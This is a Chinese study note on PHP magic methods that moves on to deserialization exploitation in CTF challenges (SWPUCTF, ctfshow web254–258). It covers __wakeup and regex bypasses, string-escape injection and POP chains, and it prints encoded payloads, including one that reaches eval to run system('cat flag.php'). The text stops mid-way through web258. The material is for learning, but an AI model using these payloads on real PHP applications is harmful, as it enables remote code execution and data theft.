&lt;?phpclass Person&#123;                                 function say()    &#123;           echo &quot;Hello, world!&lt;br&gt;&quot;;    &#125;         function __call($funName, $arguments)    &#123;          echo &quot;The function you called：&quot; . $funName . &quot;(parameter：&quot; ;  // Print the method&#x27;s name that is not existed.          print_r($arguments); // Print the parameter list of the method that is not existed.          echo &quot;)does not exist!！&lt;br&gt;\n&quot;;                       &#125;                                         &#125;$Person = new Person();           $Person-&gt;run(&quot;teacher&quot;); // If the method which is not existed is called within the object, then the __call() method will be called automatically.$Person-&gt;eat(&quot;John&quot;, &quot;apple&quot;);             $Person-&gt;say();显示结果The function you called: run (parameter: Array([0] =&gt; teacher)) does not exist!The function you called: eat (parameter: Array([0] =&gt; John[1] =&gt; apple)) does not exist!Hello world!

__callStatic()当在程序中调用未定义的静态方法，__callStatic() 方法将会被自动调用。
__callStatic()的用法类似于__call()，例子代码与上面例子的基本相似，其中的 ::代表调用静态方法
$Person::run(&quot;teacher&quot;); // 如果此项目内不存在的方法被调用了，那么 __callStatic() 方法将被自动调用。$Person::eat(&quot;John&quot;, &quot;apple&quot;);

__isset如果在对象外部使用 isset () 方法，则有两种情况：
如果该参数是公共属性，则可以使用 isset () 方法确定是否设置了该属性。
如果参数是私有属性，则 isset () 方法将不起作用。当然，只要在类中定义__isset () 方法，就可以在类外部使用 isset () 方法来确定是否设置了私有属性。
当在未定义或不可访问的属性上调用 isset () 或 empty () 时，将调用__isset () 方法。下面是一个例子：
public function __isset($content) &#123;    echo &quot;The &#123;$content&#125; property is private，the __isset() method is called automatically.&lt;br&gt;&quot;;    echo  isset($this-&gt;$content);    &#125;

__unset与 isset () 方法类似，当在未定义或不可访问的属性上调用 unset () 方法时，将调用 unset () 方法 
public function __unset($content) &#123;        echo &quot;It is called automatically when we use the unset() method outside the class.&lt;br&gt;&quot;;        echo  isset($this-&gt;$content);    &#125;&#125;$person = new Person(&quot;John&quot;, 25); // Initially assigned.unset($person-&gt;sex),&quot;&lt;br&gt;&quot;;unset($person-&gt;name),&quot;&lt;br&gt;&quot;;unset($person-&gt;age),&quot;&lt;br&gt;&quot;;

__debugInfo当执行 var_dump() 方法时，__debugInfo() 方法会被自动调用。如果 __debugInfo() 方法未被定义，那么 var_dump 方法或打印出这个对象的所有属性
&lt;?phpclass C &#123;    private $prop;    public function __construct($val) &#123;        $this-&gt;prop = $val;    &#125;    public function __debugInfo() &#123;        return [            &#x27;propSquared&#x27; =&gt; $this-&gt;prop ** 2,        ];    &#125;//返回必须是数组&#125;var_dump(new C(42));执行结果如下：object(C)#1 (1) &#123; [&quot;propSquared&quot;]=&gt; int(1764) &#125;

__set_state () （不懂）从 PHP 5.1.0 开始，在调用 var_export () 导出类代码时会自动调用__set_state () 方法。
__set_state () 方法的参数是一个包含所有属性值的数组，其格式为 array (‘property’&#x3D;&gt; value，…)
在以下示例中，没有定义__set_state () 方法：
&lt;?phpclass Person&#123;    public $sex;    public $name;    public $age;    public function __construct($name=&quot;&quot;,  $age=25, $sex=&#x27;Male&#x27;)    &#123;        $this-&gt;name = $name;        $this-&gt;age  = $age;        $this-&gt;sex  = $sex;    &#125;&#125;$person = new Person(&#x27;John&#x27;);var_export($person);执行结果如下：Person::__set_state(array( &#x27;sex&#x27; =&gt; &#x27;Male&#x27;, &#x27;name&#x27; =&gt; &#x27;John&#x27;, &#x27;age&#x27; =&gt; 25, ))

定义__set_state () 方法：
public static function __set_state($an_array)    &#123;        $a = new Person();        $a-&gt;name = $an_array[&#x27;name&#x27;];        return $a;    &#125;&#125;$person = new Person(&#x27;John&#x27;);$person-&gt;name = &#x27;Jams&#x27;;var_export($person);执行结果如下：Person::__set_state(array( &#x27;sex&#x27; =&gt; &#x27;Male&#x27;, &#x27;name&#x27; =&gt; &#x27;Jams&#x27;, &#x27;age&#x27; =&gt; 25, ))

__clone()在 PHP 中，我们可以使用 clone 关键字通过以下语法克隆对象：
$copy_of_object = clone $object;

但是，使用 clone 关键字只是一个浅拷贝，因为所有引用的属性仍将指向原始变量。
如果在对象中定义了 clone () 方法，则将在复制生成的对象中调用 clone () 方法，该方法可用于修改属性的值 (如有必要)
&lt;?phpclass Person&#123;    public $sex;    public $name;    public $age;    public function __construct($name=&quot;&quot;,  $age=25, $sex=&#x27;Male&#x27;)    &#123;        $this-&gt;name = $name;        $this-&gt;age  = $age;        $this-&gt;sex  = $sex;    &#125;    public function __clone()    &#123;        echo __METHOD__.&quot;your are cloning the object.&lt;br&gt;&quot;;        //$this-&gt;name = &quot;Joe&quot; //复制对象时重置姓名为Joe    &#125;&#125;$person = new Person(&#x27;John&#x27;); // Initially assigned.$person2 = clone $person;var_dump(&#x27;persion1:&#x27;);var_dump($person);echo &#x27;&lt;br&gt;&#x27;;var_dump(&#x27;persion2:&#x27;);var_dump($person2);运行结果如下：Person::__clone your are cloning the object.string(9) &quot;persion1:&quot; object(Person)#1 (3) &#123; [&quot;sex&quot;]=&gt; string(3) &quot;Male&quot; [&quot;name&quot;]=&gt; string(6) &quot;John&quot; [&quot;age&quot;]=&gt; int(25) &#125;string(9) &quot;persion2:&quot; object(Person)#2 (3) &#123; [&quot;sex&quot;]=&gt; string(3) &quot;Male&quot; [&quot;name&quot;]=&gt; string(6) &quot;John&quot; [&quot;age&quot;]=&gt; int(25) &#125;

__autoload ()__autoload () 方法可以尝试加载未定义的类。
过去，如果要在程序文件中创建 100 个对象，则必须使用 include () 或 require () 来包含 100 个类文件，或者必须在同一类文件中定义 100 个类;那么使用__autoload () 方法呢，如下所示：
/** * file autoload_demo.php */function  __autoload($className) &#123;    $filePath = “project/class/&#123;$className&#125;.php”;    if (is_readable($filePath)) &#123;        require($filePath);    &#125;&#125;if (ConditionA) &#123;    $a = new A();    $b = new B();    $c = new C();    // …&#125; else if (ConditionB) &#123;    $a = newA();    $b = new B();    // …&#125;

当 PHP 引擎第一次使用类 A 时，如果未找到类 A，则 autoload 方法将被自动调用，并且类名称 “A” 将作为参数传递。因此，我们在 autoload () 方法中需要做的是根据类名找到相应的类文件，然后将其包含在内。如果找不到该文件，则 php 引擎将抛出异常
__unserialize()
__unserialize() 是 PHP 7.4 引入的方法，提供了一种更安全、更灵活的方式来控制对象反序列化过程。它允许开发者处理从序列化字符串恢复对象时的具体逻辑

如果类中定义了 __unserialize() 方法：

当使用 unserialize() 函数反序列化对象时，__unserialize() 方法会被调用。
这是因为 __unserialize() 提供了更直接的控制反序列化过程的方式，优先级高于 __wakeup()。

如果类中未定义 __unserialize() 方法：

当使用 unserialize() 函数反序列化对象时，如果 __unserialize() 不存在但 __wakeup() 存在，那么 __wakeup() 会被调用。

魔术方法执行顺序对于魔术方法的调用顺序, 不同的情况下会有不同的顺序
首先, 一个对象在其生命周期中一定会走过 destruct, 只有当对象没有被任何变量指向时才会被回收
当使用 new 关键字来创建一个对象时会调用 construct
对于序列化&#x2F;反序列化时的情况:
序列化时会先调用 sleep 再调用 destruct, 故而完整的调用顺序为: sleep -&gt; (变量存在) -&gt; destruct
反序列化时如果有 __wakeup 则会调用 __wakeUp 而不是 __construct, 故而逻辑为 __wakeUp/__construct -&gt; (变量存在)
当然，也有不遵守这个顺序的情况
绕过非公有字段绕过对于 php7.1+ 版本, 反序列化时若提供的命名为公有字段格式, 会忽略掉非公有字段的访问性, 而可以绕过直接直接对其赋值
这个时候我们有两种方法可以

在写序列化 php 文件时可以直接将字段改成 public
修改序列化后的字段名, 改为公开字段的样式, 记得修改字符数

绕过 __wakeup影响版本php5&lt;5.6.25,php7&lt;7.010
简单描述就是序列化字符串中表示对象属性个数的值大于真实的属性个数时会跳过__wakeup的执行
例如:
O:4:&quot;Dino&quot;:1:&#123;s:4:&quot;addr&quot;;s:3:&quot;209&quot;;&#125;

改为:
O:4:&quot;Dino&quot;:114514:&#123;s:4:&quot;addr&quot;;s:3:&quot;209&quot;;&#125;

[极客大挑战 2019]PHP __wakeup()绕过&lt;?php  include &#x27;class.php&#x27;;$select = $_GET[&#x27;select&#x27;];  $res=unserialize(@$select);&lt;?php  include &#x27;flag.php&#x27;;  error_reporting(0);  class Name&#123;   private $username = &#x27;nonono&#x27;;   private $password = &#x27;yesyes&#x27;;   public function __construct($username,$password)&#123;   $this-&gt;username = $username;   $this-&gt;password = $password;   &#125;   function __wakeup()&#123;   $this-&gt;username = &#x27;guest&#x27;;   &#125;   function __destruct()&#123;   if ($this-&gt;password != 100) &#123;   echo &quot;&lt;/br&gt;NO!!!hacker!!!&lt;/br&gt;&quot;;   echo &quot;You name is: &quot;;   echo $this-&gt;username;echo &quot;&lt;/br&gt;&quot;;   echo &quot;You password is: &quot;;   echo $this-&gt;password;echo &quot;&lt;/br&gt;&quot;;   die();   &#125;   if ($this-&gt;username === &#x27;admin&#x27;) &#123;   global $flag;   echo $flag;   &#125;else&#123;   echo &quot;&lt;/br&gt;hello my friend~~&lt;/br&gt;sorry i can&#x27;t give you the flag!&quot;;   die();   &#125;   &#125;  &#125;

看源码我们需要password&#x3D;100,username&#x3D;admin,但反序列化过程中wakeup方法里会把username赋值为guest；
&lt;?php  class Name&#123;   private $username = &#x27;admin&#x27;;   private $password = &#x27;100&#x27;;   public function __construct($username,$password)&#123;   $this-&gt;username = $username;   $this-&gt;password = $password;   &#125;  &#125;  $a=new Name(&#x27;admin&#x27;,&#x27;100&#x27;);  echo urlencode(serialize($a));  //echo serialize($a);  //O%3A4%3A%22Name%22%3A2%3A%7Bs%3A14%3A%22%00Name%00username%22%3Bs%3A5%3A%22admin%22%3Bs%3A14%3A%22%00Name%00password%22%3Bs%3A3%3A%22100%22%3B%7D  ?&gt;

先生成一个对象，然后序列化，修改对象个数为大于2并Url编码，套到题目里面去，得到flag
十六进制绕过字符匹配我们可以使用十六进制搭配上已转义字符串来绕过对某些字符的检测，例子如下：
&lt;?phpclass Read&#123;    public $name;    public function __wakeup()    &#123;        if ($this-&gt;name == &quot;flag&quot;)        &#123;            echo &quot;You did it!&quot;;        &#125;    &#125;&#125;$str = &#x27;&#x27;;if (strpos($str, &quot;flag&quot;) === false)&#123;    $obj = unserialize($str);&#125;else&#123;    echo &quot;You can&#x27;t do it!&quot;;&#125;

这里检测了是否包含 flag 字符, 我们可以尝试使用 flag 的十六进制 \66\6c\61\67 来绕过, 构造以下:
&#x27;O:4:&quot;Read&quot;:1:&#123;s:4:&quot;name&quot;;S:4:&quot;\66\6c\61\67&quot;;&#125;&#x27;

利用好引用对于需要判断两个变量是否相等时, 我们可以考虑使用引用来让两个变量始终相等.
这个相当于一个指针一样, 代码如下:
class A &#123;    public $a;    public $b;&#125;$a = new A();$a-&gt;a = &amp;$a-&gt;b;echo serialize($a);

序列化后的结果为:
O:1:&quot;A&quot;:2:&#123;s:1:&quot;a&quot;;N;s:1:&quot;b&quot;;R:2;&#125;

对象反序列化正则绕过有些时候我们会看到^O:\d+ 这种的正则表达式, 要求开头不能为对象反序列化
这种情况我们有以下绕过手段

由于\d只判断了是否为数字, 则可以在个数前添加+号来绕过正则表达式
将这个对象嵌套在其他类型的反序列化之中, 例如数组

当然, 第一种更佳. 因为若不只匹配开头则仍可以绕过
字符逃逸对于字符逃逸, 由于 PHP 序列化后的字符类型中的引号不会被转义, 对于字符串末尾靠提供的字符数量来读取, 对于服务端上将传入的字符串实际长度进行增加或减少(例如替换指定字符到更长&#x2F;短的字符), 我们就可以将其溢出并我们的恶意字符串反序列化.
由短变长&lt;?phpclass Book&#123;    public $id = 114514;    public $name = &quot;Kengwang 学习笔记&quot;; // 可控    public $path = &quot;Kengwang 学习笔记.md&quot;;&#125;function filter($str)&#123;    return str_replace(&quot;&#x27;&quot;, &quot;\\&#x27;&quot;, $str);&#125;$exampleBook = new Book();echo &quot;[处理前]&lt;br&gt;\n&quot;;$ser = serialize($exampleBook);echo $ser . &quot;&lt;br&gt;\n&quot;;echo &quot;[处理后]&lt;br&gt;\n&quot;;$ser = filter($ser);echo $ser . &quot;&lt;br&gt;\n&quot;;echo &quot;[文件路径] &lt;br&gt;\n&quot;;$exampleBook = unserialize($ser);echo $exampleBook-&gt;path . &quot;&lt;br&gt;\n&quot;;

这种情况下我们通常只能控制其中的一个字符变量,  而不是整个反序列话字符串. 题目会将其先序列化, 再进行字符处理, 之后再反序列化(类似于将对象存储到数据库)
此代码会将其中的单引号过滤成为转义+单引号, 此时字符串的长度会进行变化, 我们可以利用这一点使 name 中的东西溢出到 path 中.
我们构造恶意字符串时需要先将前面的双引号闭合,同时分号表示此变量结束. 在攻击变量结束之后我们需要用 ;&#125; 结束当前的序列化, 会自动忽略掉这之后的序列化
我们的每一个单引号会变成两个字符, 于是可以将我们的恶意字符给顶掉, 我们只需要提供恶意字符串长度个会被放大变成两倍的字符.
当然如果不是两倍, 我们可以灵活运用 + 来进行倍数配齐
例如我们需要恶意构造  &quot;;s:4:&quot;path&quot;;s:4:&quot;flag&quot;;&#125;s:4:&quot;fake&quot;;s:34:, 长度为 41, 于是我们提供 41 个&#39;，最终给 name 的赋值为
Kengwang 的学习笔记&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&quot;;s:4:&quot;path&quot;;s:4:&quot;flag&quot;;&#125;s:4:&quot;fake&quot;;s:34:

运行结果如下：
[处理前]O:4:&quot;Book&quot;:3:&#123;s:2:&quot;id&quot;;i:114514;s:4:&quot;name&quot;;s:106:&quot;Kengwang 的学习笔记&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&quot;;s:4:&quot;path&quot;;s:4:&quot;flag&quot;;&#125;s:4:&quot;fake&quot;;s:34:&quot;;s:4:&quot;path&quot;;s:27:&quot;Kengwang 的学习笔记.md&quot;;&#125;[处理后]O:4:&quot;Book&quot;:3:&#123;s:2:&quot;id&quot;;i:114514;s:4:&quot;name&quot;;s:106:&quot;Kengwang 的学习笔记\&#x27;\&#x27;\&#x27;\&#x27;\&#x27;\&#x27;\&#x27;\&#x27;\&#x27;\&#x27;\&#x27;\&#x27;\&#x27;\&#x27;\&#x27;\&#x27;\&#x27;\&#x27;\&#x27;\&#x27;\&#x27;\&#x27;\&#x27;\&#x27;\&#x27;\&#x27;\&#x27;\&#x27;\&#x27;\&#x27;\&#x27;\&#x27;\&#x27;\&#x27;\&#x27;\&#x27;\&#x27;\&#x27;\&#x27;\&#x27;\&#x27;&quot;;s:4:&quot;path&quot;;s:4:&quot;flag&quot;;&#125;s:4:&quot;fake&quot;;s:34:&quot;;s:4:&quot;path&quot;;s:27:&quot;Kengwang 的学习笔记.md&quot;;&#125;[文件路径]flag

可以看到 path 被替换成了 flag
由长变短&lt;?phpclass Book&#123;    public $id = 1919810;    public $name = &quot;Kengwang 的学习笔记&quot;; // 可控    public $description = &quot;The WORST Web Security Leaning Note&quot;; // 可控    public $path = &quot;Kengwang 的学习笔记.md&quot;;&#125;function filter($str)&#123;    return str_replace(&quot;&#x27;&quot;, &quot;&quot;, $str);&#125;$exampleBook = new Book();echo &quot;[处理前]\n&quot;;$ser = serialize($exampleBook);echo $ser . &quot;\n&quot;;echo &quot;[处理后]\n&quot;;$ser = filter($ser);echo $ser . &quot;\n&quot;;echo &quot;[文件路径] \n&quot;;$exampleBook = unserialize($ser);echo $exampleBook-&gt;path . &quot;\n&quot;;

正常序列化后的字符串：
O:4:&quot;Book&quot;:4:&#123;s:2:&quot;id&quot;;i:114514;s:4:&quot;name&quot;;s:24:&quot;Kengwang 的学习笔记&quot;;s:11:&quot;description&quot;;s:35:&quot;The WORST Web Security Leaning Note&quot;;s:4:&quot;path&quot;;s:27:&quot;Kengwang 的学习笔记.md&quot;;&#125;

我们需要让 &quot;;s:11:&quot;description&quot;;s:35: 被吞掉作为 name 变量的值, description的前引号会将其闭合, 此后 description 中的就会逃逸出成为反序列化串, 于是我们在 name 中填入 要被吞掉的字符数目 个&#39;, 于是尝试
将 name 赋值为 Kengwang Note&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;
将 description 赋值为 ;s:4:&quot;path&quot;;s:4:&quot;flag&quot;;s:11:&quot;description&quot;;s:0:&quot;&quot;;&#125;s:0:&quot;
得到结果如下
[处理前]O:4:&quot;Book&quot;:4:&#123;s:2:&quot;id&quot;;i:114514;s:4:&quot;name&quot;;s:39:&quot;Kengwang Note&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&quot;;s:11:&quot;description&quot;;s:55:&quot;;s:4:&quot;path&quot;;s:4:&quot;flag&quot;;s:11:&quot;description&quot;;s:0:&quot;&quot;;&#125;s:0:&quot;&quot;;s:4:&quot;path&quot;;s:27:&quot;Kengwang 的学习 笔记.md&quot;;&#125;[处理后]O:4:&quot;Book&quot;:4:&#123;s:2:&quot;id&quot;;i:114514;s:4:&quot;name&quot;;s:39:&quot;Kengwang Note&quot;;s:11:&quot;description&quot;;s:55:&quot;;s:4:&quot;path&quot;;s:4:&quot;flag&quot;;s:11:&quot;description&quot;;s:0:&quot;&quot;;&#125;s:0:&quot;&quot;;s:4:&quot;path&quot;;s:27:&quot;Kengwang 的学习笔记.md&quot;;&#125;[文件路径]flag

POP链构造做这种题关键是php魔术方法，构造POP先找到头部和尾部，头部就是用户可控的地方，也就是可以传入参数的地方，然后找尾部，比如关键代码，eval,file_put_contents这种，然后从尾部开始推导，根据魔术方法的特性，一步一步往上触发
难的是要找出这条链，直接上实例来理解
[SWPUCTF 2021 新生赛]pop&lt;?phperror_reporting(0);show_source(&quot;index.php&quot;);class w44m&#123;    private $admin = &#x27;aaa&#x27;;    protected $passwd = &#x27;123456&#x27;;    public function Getflag()&#123;        if($this-&gt;admin === &#x27;w44m&#x27; &amp;&amp; $this-&gt;passwd ===&#x27;08067&#x27;)&#123;            include(&#x27;flag.php&#x27;);            echo $flag;        &#125;else&#123;            echo $this-&gt;admin;            echo $this-&gt;passwd;            echo &#x27;nono&#x27;;        &#125;    &#125;&#125;class w22m&#123;    public $w00m;    public function __destruct()&#123;        echo $this-&gt;w00m;    &#125;&#125;class w33m&#123;    public $w00m;    public $w22m;    public function __toString()&#123;        $this-&gt;w00m-&gt;&#123;$this-&gt;w22m&#125;();        return 0;    &#125;&#125;$w00m = $_GET[&#x27;w00m&#x27;];unserialize($w00m);

POP链入手，先找关键代码，然后推断
需要admin为w44m，passwd为08067 才能得到flag
if($this-&gt;admin &#x3D;&#x3D;&#x3D; ‘w44m’ &amp;&amp; $this-&gt;passwd &#x3D;&#x3D;&#x3D;’08067’){
echo $flag;
发现可以利用$this-&gt;w00m-&gt;{$this-&gt;w22m}();
这个地方，修改w22m&#x3D;getflag，那么这个地方就有getflag()函数了
在类w22m中 方法__destruct中echo $this-&gt;w00m;echo了一个对象，会触发tostring方法
前面魔术方法提到
__toString 当一个对象被当作一个字符串被调用。这样的话我们便可以利用to_Sting方法里面的代码了，传参点是w00m，
链子构造为 w22m::__destruct-&gt;w33m::toString-&gt;w44m::getflag
poc如下，这里要用urlencode，因为我们前面提到private和protected生产序列化有不可见字符
&lt;?php  class w44m&#123;   private $admin = &#x27;w44m&#x27;;   protected $passwd = &#x27;08067&#x27;;  &#125;  class w22m&#123;   public $w00m;   public function __destruct()&#123;   echo $this-&gt;w00m;   &#125;  &#125;  class w33m&#123;   public $w00m=&quot;&quot;;   public $w22m=&quot;getflag&quot;;   public function __toString()&#123;   $this-&gt;w00m-&gt;&#123;$this-&gt;w22m&#125;();   return 1;   &#125;  &#125;  $a=new w22m();  $a-&gt;w00m=new w33m();  $a-&gt;w00m-&gt;w00m=new w44m();  echo urlencode( serialize($a));  

CTFshowweb254&lt;?php    error_reporting(0);highlight_file(__FILE__);include(&#x27;flag.php&#x27;);class ctfShowUser&#123;    public $username=&#x27;xxxxxx&#x27;;    public $password=&#x27;xxxxxx&#x27;;    public $isVip=false;    public function checkVip()&#123;        return $this-&gt;isVip;    &#125;    public function login($u,$p)&#123;        if($this-&gt;username===$u&amp;&amp;$this-&gt;password===$p)&#123;            $this-&gt;isVip=true;        &#125;        return $this-&gt;isVip;    &#125;    public function vipOneKeyGetFlag()&#123;        if($this-&gt;isVip)&#123;            global $flag;            echo &quot;your flag is &quot;.$flag;        &#125;else&#123;            echo &quot;no vip, no flag&quot;;        &#125;    &#125;&#125;$username=$_GET[&#x27;username&#x27;];$password=$_GET[&#x27;password&#x27;];if(isset($username) &amp;&amp; isset($password))&#123;    $user = new ctfShowUser();    if($user-&gt;login($username,$password))&#123;        if($user-&gt;checkVip())&#123;            $user-&gt;vipOneKeyGetFlag();        &#125;    &#125;else&#123;        echo &quot;no vip,no flag&quot;;    &#125;&#125;

这道题并没有考到反序列化的相关知识点，而是考你阅读代码的能力，这题的得到flag的前提是get传参进来的username和password要和类中一开始定义的值一样
所以我们get传参：?username=xxxxxx&amp;password=xxxxxx
得到flag，题目解决
web255&lt;?phperror_reporting(0);highlight_file(__FILE__);include(&#x27;flag.php&#x27;);class ctfShowUser&#123;    public $username=&#x27;xxxxxx&#x27;;    public $password=&#x27;xxxxxx&#x27;;    public $isVip=false;    public function checkVip()&#123;        return $this-&gt;isVip;    &#125;    public function login($u,$p)&#123;        return $this-&gt;username===$u&amp;&amp;$this-&gt;password===$p;    &#125;    public function vipOneKeyGetFlag()&#123;        if($this-&gt;isVip)&#123;            global $flag;            echo &quot;your flag is &quot;.$flag;        &#125;else&#123;            echo &quot;no vip, no flag&quot;;        &#125;    &#125;&#125;$username=$_GET[&#x27;username&#x27;];$password=$_GET[&#x27;password&#x27;];if(isset($username) &amp;&amp; isset($password))&#123;    $user = unserialize($_COOKIE[&#x27;user&#x27;]);        if($user-&gt;login($username,$password))&#123;        if($user-&gt;checkVip())&#123;            $user-&gt;vipOneKeyGetFlag();        &#125;    &#125;else&#123;        echo &quot;no vip,no flag&quot;;    &#125;&#125;

这道题开始简单的反序列化了，这次类中的函数login不会在改变$isVip的值，而是单纯地用作判断
观察下面的代码逻辑，首先要get传参进两个变量username和password的值，然后要让这两个值的等于原本类中的值，成立了之后会判断函数checkVip()的布尔值要为true，符合要求后才会得到flag
因为题目中有反序列化的步骤，所以我们要自己构造序列化的代码，如下：
&lt;?phperror_reporting(0);highlight_file(__FILE__);include(&#x27;flag.php&#x27;);class ctfShowUser&#123;    public $username=&#x27;root&#x27;;    public $password=&#x27;root&#x27;;    public $isVip=true;&#125;$a = new ctfShowUser();echo urlencode(serialize($a));

得到编码后的序列化为：O%3A11%3A%22ctfShowUser%22%3A3%3A%7Bs%3A8%3A%22username%22%3Bs%3A4%3A%22root%22%3Bs%3A8%3A%22password%22%3Bs%3A4%3A%22root%22%3Bs%3A5%3A%22isVip%22%3Bb%3A1%3B%7D
回到题目环境，get传参：?username=root&amp;password=root，然后在hackbar中的cookie处写入：user=O%3A11%3A%22ctfShowUser%22%3A3%3A%7Bs%3A8%3A%22username%22%3Bs%3A4%3A%22root%22%3Bs%3A8%3A%22password%22%3Bs%3A4%3A%22root%22%3Bs%3A5%3A%22isVip%22%3Bb%3A1%3B%7D
发送，得到flag，题目解决
web256&lt;?phperror_reporting(0);highlight_file(__FILE__);include(&#x27;flag.php&#x27;);class ctfShowUser&#123;    public $username=&#x27;xxxxxx&#x27;;    public $password=&#x27;xxxxxx&#x27;;    public $isVip=false;    public function checkVip()&#123;        return $this-&gt;isVip;    &#125;    public function login($u,$p)&#123;        return $this-&gt;username===$u&amp;&amp;$this-&gt;password===$p;    &#125;    public function vipOneKeyGetFlag()&#123;        if($this-&gt;isVip)&#123;            global $flag;            if($this-&gt;username!==$this-&gt;password)&#123;                    echo &quot;your flag is &quot;.$flag;              &#125;        &#125;else&#123;            echo &quot;no vip, no flag&quot;;        &#125;    &#125;&#125;$username=$_GET[&#x27;username&#x27;];$password=$_GET[&#x27;password&#x27;];if(isset($username) &amp;&amp; isset($password))&#123;    $user = unserialize($_COOKIE[&#x27;user&#x27;]);        if($user-&gt;login($username,$password))&#123;        if($user-&gt;checkVip())&#123;            $user-&gt;vipOneKeyGetFlag();        &#125;    &#125;else&#123;        echo &quot;no vip,no flag&quot;;    &#125;&#125;

这道题和上面一道题的区别在于username的值和password的值要不一样，改一下就可以了，序列化后的值如下：
O%3A11%3A%22ctfShowUser%22%3A3%3A%7Bs%3A8%3A%22username%22%3Bs%3A4%3A%22root%22%3Bs%3A8%3A%22password%22%3Bs%3A4%3A%22flag%22%3Bs%3A5%3A%22isVip%22%3Bb%3A1%3B%7D

得到flag，题目解决
web257&lt;?phperror_reporting(0);highlight_file(__FILE__);class &#123;    private $username=&#x27;xxxxxx&#x27;;    private $password=&#x27;xxxxxx&#x27;;    private $isVip=false;    private $class = &#x27;info&#x27;;    public function __construct()&#123;        $this-&gt;class=new info();    &#125;    public function login($u,$p)&#123;        return $this-&gt;username===$u&amp;&amp;$this-&gt;password===$p;    &#125;    public function __destruct()&#123;        $this-&gt;class-&gt;getInfo();    &#125;&#125;class info&#123;    private $user=&#x27;xxxxxx&#x27;;    public function getInfo()&#123;        return $this-&gt;user;    &#125;&#125;class backDoor&#123;    private $code;    public function getInfo()&#123;        eval($this-&gt;code);    &#125;&#125;$username=$_GET[&#x27;username&#x27;];$password=$_GET[&#x27;password&#x27;];if(isset($username) &amp;&amp; isset($password))&#123;    $user = unserialize($_COOKIE[&#x27;user&#x27;]);    $user-&gt;login($username,$password);&#125;

这题难度加大了一点，我们先来分析一下源码
类ctfShowUser的__construct()方法中会初始化一个类info，赋给$class，__destruct()方法会调用$class对象中的函数getInfo
我们可以看到类info中的getInfo函数中并没有什么有价值的东西，反而是另一个类backDoor中的同名函数，里面有危险函数eval，可以将其中的任意字符串当作php代码执行，这题中的是$this-&gt;code，所以我们要通过它进行rce
所以综上我们在类ctfShowUser的__construct()方法中应该初始化类backDoor
get传参：?username=xxxxxx&amp;password=xxxxxx
我们构造的序列化代码如下：
&lt;?phpclass ctfShowUser&#123;    private $username=&#x27;xxxxxx&#x27;;    private $password=&#x27;xxxxxx&#x27;;    private $isVip=false;    private $class = &#x27;info&#x27;;    public function __construct()&#123;        $this-&gt;class=new backDoor();    &#125;&#125;class backDoor&#123;    private $code=&quot;system(&#x27;ls&#x27;);&quot;;    public function getInfo()&#123;        eval($this-&gt;code);    &#125;&#125;$a = new ctfShowUser();echo urlencode(serialize($a));

得到的序列化编码为：
O%3A11%3A%22ctfShowUser%22%3A4%3A%7Bs%3A21%3A%22%00ctfShowUser%00username%22%3Bs%3A6%3A%22xxxxxx%22%3Bs%3A21%3A%22%00ctfShowUser%00password%22%3Bs%3A6%3A%22xxxxxx%22%3Bs%3A18%3A%22%00ctfShowUser%00isVip%22%3Bb%3A0%3Bs%3A18%3A%22%00ctfShowUser%00class%22%3BO%3A8%3A%22backDoor%22%3A1%3A%7Bs%3A14%3A%22%00backDoor%00code%22%3Bs%3A13%3A%22system%28%27ls%27%29%3B%22%3B%7D%7D

页面回显：flag.php，index.php
改一下外部命令为：cat flag.php，序列化后编码如下：
O%3A11%3A%22ctfShowUser%22%3A4%3A%7Bs%3A21%3A%22%00ctfShowUser%00username%22%3Bs%3A6%3A%22xxxxxx%22%3Bs%3A21%3A%22%00ctfShowUser%00password%22%3Bs%3A6%3A%22xxxxxx%22%3Bs%3A18%3A%22%00ctfShowUser%00isVip%22%3Bb%3A0%3Bs%3A18%3A%22%00ctfShowUser%00class%22%3BO%3A8%3A%22backDoor%22%3A1%3A%7Bs%3A14%3A%22%00backDoor%00code%22%3Bs%3A23%3A%22system%28%27cat+flag.php%27%29%3B%22%3B%7D%7D

得到flag，题目解决
web258&lt;?phperror_reporting(0);highlight_file(__FILE__);class ctfShowUser&#123;    public $username=&#x27;xxxxxx&#x27;;    public $password=&#x27;xxxxxx&#x27;;    public $isVip=false;    public $class = &#x27;info&#x27;;    public function __construct()&#123;        $this-&gt;class=new info();    &#125;    public function login($u,$p)&#123;        return $this-&gt;username===$u&amp;&amp;$this-&gt;password===$p;    &#125;    public function __destruct()&#123;        $this-&gt;class-&gt;getInfo();    &#125;&#125;class info&#123;    public $user=&#x27;xxxxxx&#x27;;    public function getInfo()&#123;        return $this-&gt;user;    &#125;&#125;class backDoor&#123;    public $code;    public function getInfo()&#123;        eval($this-&gt;code);    &#125;&#125;$username=$_GET[&#x27;username&#x27;];$password=$_GET[&#x27;password&#x27;];if(isset($username) &amp;&amp; isset($password))&#123;    if(!preg_match(&#x27;/[oc]:\d+:/i&#x27;, $_COOKIE[&#x27;user&#x27;]))&#123;        $user = unserialize($_COOKIE[&#x27;user&#x27;]);    &#125;    $user-&gt;login($username,$password);&#125;

这题与上题不一样的地方就是多了一个正则表达式匹配，这个正则的作用是检查 $_COOKIE[&#39;user&#39;] 的值是否匹配以下模式：

以字符 o 或 c 开头（不区分大小写），
后跟一个冒号 :,
然后是一或多个数字，
再后跟一个冒号 :

